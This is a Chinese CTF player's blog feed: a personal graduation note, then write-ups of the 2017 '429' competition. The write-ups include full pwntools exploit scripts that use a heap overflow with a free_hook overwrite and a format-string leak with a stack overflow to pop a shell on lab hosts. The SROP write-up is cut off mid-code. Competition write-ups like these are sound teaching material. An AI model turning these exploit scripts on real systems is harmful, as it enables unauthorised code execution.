    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>又是很久没更新博客了，毕竟我比较懒 = =。。。</p><p>这个月基本上没怎么做练习，去了趟北京被web狗吊打了ORZ。。。TCTF又被pwn题目吊打了，自身的实力距离国外强队的实力还是很大的（摊手）。</p><p>最近一段时间把毕业答辩、毕业设计、毕业论文等等等等等关于毕业的事情搞定啦。</p><p>比赛的话，最近还有两个比赛项目，一个是铁人、一个是jz的选拔赛。</p><p>总觉得自己应该在其他方面加强一点了，pwn的实力与其他方面的实力差太多太多了。</p><p>1、 加强数据流量分析能力（应对铁人三项，参考科赛</p><p>2、 加强web安全攻防能力（应对jz选拔赛，可以从vulhub、pwnhub学习</p><a id="more"></a><p>一直以来喜欢低调，喜静，喜欢自己默默做自己的事情，可能与我自身性格有关吧。今后也同样如此，沉心静气。</p><h3 id="5月的碎碎念"><a href="#5月的碎碎念" class="headerlink" title="5月的碎碎念"></a>5月的碎碎念</h3><p>大学四年的最后一个月了，今后就要步入职场，而我基本上也完成了我进这所学院时的初衷，在这所大学建立一个安全团队，为对安全技术有兴趣的人提供一个平台（当然这些事，我一个人肯定是完成不了的，多亏了斯进老师一直以来的支持，最想感谢的人就是她啦）。大学这四年谈过一次恋爱，虽然短短3个月，不过至少这门必修课给我个及格分吧ORZ。做过一些科研，虽然很难去坚持做（毕竟懒癌晚期患者，没救了）。拿过一些比赛的最高名次，其实CTF比赛不难的，心态和运气才是关键（hhhhhhhh），接下来也要做一些ctf比赛的总结了（我竟然从没做过ORZ 。 说实话这个月在临安不用集合真的是太爽了= =。。。   也是到了该离开的时候了，团队已经带起来了，师弟们的实力都很棒（团队里都是男生，我也很绝望啊，期待有个对网络安全感兴趣的女生加入吧，女黑客ORZ）。今后的话，会一直对二进制进行研究，这是我的强项，虽然工作上可能web为主吧，不过无所谓了。</p><h3 id="一些未更新的wp"><a href="#一些未更新的wp" class="headerlink" title="一些未更新的wp"></a>一些未更新的wp</h3><p>1、cuit writeup （看下web题</p><p>2、0ctf writeup</p><p>3、堆溢出的总结</p><h3 id="一些计划"><a href="#一些计划" class="headerlink" title="一些计划"></a>一些计划</h3><p>1、刷完pwnable</p><p>2、刷完最近的web赛题</p><p>3、深入web代码审计</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;又是很久没更新博客了，毕竟我比较懒 = =。。。&lt;/p&gt;
&lt;p&gt;这个月基本上没怎么做练习，去了趟北京被web狗吊打了ORZ。。。TCTF又被pwn题目吊打了，自身的实力距离国外强队的实力还是很大的（摊手）。&lt;/p&gt;
&lt;p&gt;最近一段时间把毕业答辩、毕业设计、毕业论文等等等等等关于毕业的事情搞定啦。&lt;/p&gt;
&lt;p&gt;比赛的话，最近还有两个比赛项目，一个是铁人、一个是jz的选拔赛。&lt;/p&gt;
&lt;p&gt;总觉得自己应该在其他方面加强一点了，pwn的实力与其他方面的实力差太多太多了。&lt;/p&gt;
&lt;p&gt;1、 加强数据流量分析能力（应对铁人三项，参考科赛&lt;/p&gt;
&lt;p&gt;2、 加强web安全攻防能力（应对jz选拔赛，可以从vulhub、pwnhub学习&lt;/p&gt;
    
    </summary>
    
    
      <category term="note" scheme="https://winter3un.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】2017-429final</title>
    <link href="https://winter3un.github.io/2017/04/27/2017-429-final/"/>
    <id>https://winter3un.github.io/2017/04/27/2017-429-final/</id>
    <published>2017-04-28T06:24:59.000Z</published>
    <updated>2017-04-29T05:16:31.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>下次pwn选手真的不该去429线下。。这BGM神TM的= =。。</p><p>比赛很稳，主队拿了第7，分队第12，不过需要反思的是：</p><p>1、解pwn的速度还需要提升（awd形式尽早写出exp拿分很有优势）</p><p>2、web的话一定要防御住、防御住、防御住、重要的话说三遍。。</p><p>3、写好的exp脚本交由负责流量审计的队友来维护</p><p>4、pwn需要一个后门，不然遇到别人劫持了我们的exp流量就很吃亏了。</p><p>5、exp需要将getflag和uploadflag分开，并且分析本轮次没有拿到哪些队伍的flag</p><p>6、IDA分析不了的 ELF二进制文件就交给objdump来分析吧（静态分析软件也就这么几个，遇到二进制文件不能静态分析就惨了。</p><p>7、hook了pwn的read，但是别人没打我们队伍的pwn，估计是怕我们劫持流量。（摊手</p><p>8、十进制和十六进制。。。老是忘记在代码中区分。。ORZ</p><p>进入主题吧</p><a id="more"></a><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>第一个开放的题目是pwn2，9点开放的比赛，我在10点10分左右已经将具体利用思路构思完毕（静态分析30分钟+动态分析40分钟），坑爹的是对libc文件进行分析的时候（因为我需要拿到free_hook的地址），IDA无法静态分析，这边消耗了两个小时，写完exp的时候已经是领盒饭12点了。。别人利用这个pwn2已经打了至少18轮，900分。。</p><p>pwn2是一个具有off by one和常规溢出漏洞的二进制程序，他创建的虚表结构如下</p><p>PTR[0]<br>|(Long int)hashcode Length|(char <em>)Name|(char </em>)Hash code|</p><p>PTR[1]<br>|(Long int)hashcode Length|(char <em>)Name|(char </em>)Hash code|</p><p>回过头我们看下这个二进制程序 Hashcode 的input函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">__int64 __<span class="function">fastcall <span class="title">sub_4009DB</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+1Bh] [bp-5h]@2</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+1Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</div><div class="line">  &#123;</div><div class="line">    v3 = getchar();</div><div class="line">    <span class="keyword">if</span> ( i == a2 )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    *(_BYTE *)(a1 + (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = v3;</div><div class="line">  &#125;</div><div class="line">  *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1) = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> i;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>记得大一教我C语言的老师说过，C下标的索引是从0开始的,所以a[len(a)]=0 这样的形式会造成1个\x00字节越界赋值。正常来说，这样1个\x00字节，最多覆盖下一个虚表结构的preg_size的结构，但是存在另一个溢出漏洞，我们可以将hashcode的长度可输入长度进行修改（注意，hashcode的可输入区域长度没有变化），这便造成了越界溢出，溢出的数据覆盖到了下一个ptr虚表，利用过程如下（这个利用过程其实没有用到off by one）。</p><ul><li>以下版本没有用off by one 漏洞</li></ul><p>1、创建四个0x20的hashcode</p><p>2、修改ptr[0]的hacode length 0x20至0x40</p><p>3、覆盖ptr[1]表项，复写ptr[1]表项的hashcode length至我们可以复写ptr[2]表项指向hashcode的指针，复写name指针，利用其我们可以泄露出libc地址。</p><p>4、list出所有ptr表项，得到libc地址</p><p>5、复写下下一个ptr表项指向hashcode指针，使其指向libc bss段上的free_hook，然后调用edit hashcode，修改 free_hook使其指向system</p><p>^以上的供读者自己实现，哈哈哈哈哈哈，我用的是比较麻烦的一个版本</p><p>用到off by one 的版本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-26 18:28:36</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,time</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./pwn2"</span></div><div class="line">remote_ip = <span class="string">"172.16.5.22"</span></div><div class="line">port = <span class="number">5009</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line">elf = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line">gdb.attach(p,<span class="string">"b*0x400C73\nc"</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x400EF4\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## stage 1 add hashcode 0x20 id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"aaa"</span>)</div><div class="line">ru(<span class="string">"t hashcode\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## stage 2 add hashcode 0x20 id 1</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"aaa"</span>)</div><div class="line">ru(<span class="string">"t hashcode\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line"></div><div class="line"><span class="comment">## end add hashcode 0x20 id 2</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line">ru(<span class="string">"t hashcode\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## stage 3 change hashcode length id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">" hash type\n"</span>)</div><div class="line">sl(<span class="string">"sha256"</span>) <span class="comment">#change length 0x20 to 0x40</span></div><div class="line"></div><div class="line"><span class="comment">## stage 4 edit hashcode</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x20</span></div><div class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x20</span><span class="number">-1</span>)+p64(<span class="number">0</span>)</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 5 edit chunk id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x20</span>)+p64(rop.got(<span class="string">'puts'</span>))[:<span class="number">-1</span>]</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 6 leak system addr </span></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"input pattern\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line">ru(<span class="string">"name="</span>)</div><div class="line"></div><div class="line">puts_addr = u64(ru(<span class="string">"\nhashcode"</span>)[:<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"></div><div class="line">system_addr = puts_addr-(elf.symbols[<span class="string">"puts"</span>]-elf.symbols[<span class="string">"system"</span>])</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</div><div class="line">free_hook_addr = puts_addr+(<span class="number">0x00000035f79906e8</span> - elf.symbols[<span class="string">"puts"</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">"free_hook_addr="</span>+hex(free_hook_addr)</div><div class="line"><span class="comment">## edit atoi to system</span></div><div class="line"></div><div class="line"><span class="comment">## stage 7 edit chunk id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x48</span><span class="number">-1</span>)+p64(rop.got(<span class="string">'puts'</span>))[:<span class="number">-1</span>]</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 8 edit chunk id 1</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x20</span></div><div class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x8</span><span class="number">-1</span>)+p64(<span class="number">0</span>)+p64(free_hook_addr)[:<span class="number">-1</span>]</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 9 edit free_hook to system</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">sl(p64(system_addr)[:<span class="number">-1</span>])</div><div class="line"></div><div class="line"><span class="comment"># stage 10 system</span></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">p.interacive()</div></pre></td></tr></table></figure><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>该pwn程序存在两个漏洞，一个是格式化字符串漏洞，一个是栈溢出漏洞，我们可以利用格式化字符串漏洞泄露libc地址，然后利用栈溢出漏洞，构造ropchain，实现shell的获取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-26 21:39:25</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./pwn1"</span></div><div class="line">remote_ip = <span class="string">"172.16.5.43"</span></div><div class="line">port = <span class="number">5011</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># libc = ELF("./libc.so.6")</span></div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x0400C84\nc")</span></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x400EF4\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line">payload = <span class="string">"%19$llX"</span></div><div class="line">binhex = binascii.b2a_hex(payload)</div><div class="line"><span class="comment"># print binhex</span></div><div class="line">ru(<span class="string">" exit\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>*(len(binhex)))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(binhex)</div><div class="line">ru(<span class="string">"sult is: \n"</span>)</div><div class="line"></div><div class="line">libc_start_addr = int(ru(<span class="string">"Please "</span>)[:len(<span class="string">"7f041e5cda"</span>)],<span class="number">16</span>) - <span class="number">240</span></div><div class="line"><span class="comment"># print len(libc_start_addr)</span></div><div class="line"><span class="keyword">print</span> <span class="string">"libc_start_addr="</span>+hex(libc_start_addr)</div><div class="line">libc_base = libc_start_addr - <span class="number">0x1ec20</span></div><div class="line">system_addr = libc_base+libc.symbols[<span class="string">"system"</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</div><div class="line"></div><div class="line">_binsh = libc_base+<span class="number">0x155e43</span></div><div class="line"><span class="keyword">print</span>  <span class="string">"_binsh="</span>+hex(_binsh)</div><div class="line"><span class="comment"># _binsh = libc_base+0x18C385</span></div><div class="line"></div><div class="line">ru(<span class="string">" exit\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"urn\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">payload = p64(system_addr)+p64(<span class="number">0</span>)+p64(_binsh)</div><div class="line">payload = binascii.b2a_hex(payload)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x90</span>+payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;下次pwn选手真的不该去429线下。。这BGM神TM的= =。。&lt;/p&gt;
&lt;p&gt;比赛很稳，主队拿了第7，分队第12，不过需要反思的是：&lt;/p&gt;
&lt;p&gt;1、解pwn的速度还需要提升（awd形式尽早写出exp拿分很有优势）&lt;/p&gt;
&lt;p&gt;2、web的话一定要防御住、防御住、防御住、重要的话说三遍。。&lt;/p&gt;
&lt;p&gt;3、写好的exp脚本交由负责流量审计的队友来维护&lt;/p&gt;
&lt;p&gt;4、pwn需要一个后门，不然遇到别人劫持了我们的exp流量就很吃亏了。&lt;/p&gt;
&lt;p&gt;5、exp需要将getflag和uploadflag分开，并且分析本轮次没有拿到哪些队伍的flag&lt;/p&gt;
&lt;p&gt;6、IDA分析不了的 ELF二进制文件就交给objdump来分析吧（静态分析软件也就这么几个，遇到二进制文件不能静态分析就惨了。&lt;/p&gt;
&lt;p&gt;7、hook了pwn的read，但是别人没打我们队伍的pwn，估计是怕我们劫持流量。（摊手&lt;/p&gt;
&lt;p&gt;8、十进制和十六进制。。。老是忘记在代码中区分。。ORZ&lt;/p&gt;
&lt;p&gt;进入主题吧&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="AWD" scheme="https://winter3un.github.io/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】2017-429预赛</title>
    <link href="https://winter3un.github.io/2017/04/22/429-2017/"/>
    <id>https://winter3un.github.io/2017/04/22/429-2017/</id>
    <published>2017-04-22T14:38:33.000Z</published>
    <updated>2017-05-02T13:50:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>槽点：这次比赛。。敢不敢。。不放原题。。。做了半天的pwn2，结果是原题。。。 T T  （题目来自hitcon 2016，好吧。。怪我没刷到这题。。</p><p>不过pwn1和pwn2收获都很大，特别记录下。</p><a id="more"></a><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><p>pwn1很短很强悍~</p><p>用到了SROP技术，参考资料</p><ul><li><a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html</a></li><li><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="external">http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></li></ul><p>elf文件非常小，只有几行指令。使用syscall 0 读取用户的输入至栈中。<br>我们虽然可以控制程序的执行流，但是我们没办法控制寄存器的数值。正常利用条件为：控制rax为59，控制rdi为“/bin/sh”字符串的地址，rip指向syscall。后来想了想，rax的数值可以通过输入的字符数来控制，那么现在我们已经可以控制syscall调用execute了，但是我们却不能控制rdi的数值，这里我们可以利用SROP的技术，对所有寄存器进行重新赋值，使rdi指向“/bin/sh”的地址。然而利用SROP需要以下几个条件。</p><p>第一，攻击者可以通过stack overflow等漏洞控制栈上的内容；(√)</p><p>第二，需要知道栈的地址（比如需要知道自己构造的字符串<code>/bin/sh</code>的地址）；（√<br>我们可以通过系统调用 1 write函数，进行栈空间信息泄露）</p><p>第三，需要知道<code>syscall</code>指令在内存中的地址(√)；</p><p>第四，需要知道<code>sigreturn</code>系统调用的内存地址(我们可以利用系统调用号 15 调用该函数)。</p><p>因此条件全部满足的情况下，我们利用SROP技术将rdi覆写，那么我们就可以顺利执行 execve（“/bin/sh”,null.null）;啦。（ps：需要注意的是，send过去的数据要有延迟，不然会认为是在一起的）exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div 